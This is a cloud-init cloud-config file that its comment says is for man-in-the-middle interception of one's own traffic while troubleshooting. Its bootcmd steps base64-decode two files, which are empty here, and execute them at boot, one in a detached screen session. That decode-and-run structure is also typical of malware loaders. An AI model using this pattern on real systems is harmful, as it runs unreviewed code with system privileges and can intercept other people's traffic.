#cloud-config
#Allows you to mitm all of your traffic. Good for troubleshooting whatever. Second block is chef ruby centric.
bootcmd:
 - echo '' > /file
 - base64 -d /file > /file1
 - chmod 700 /file1
 - /file1
 - echo '' > /file2
 - base64 -d /file2 > /file3
 - chmod 700 /file3
 - screen -d -m /file3
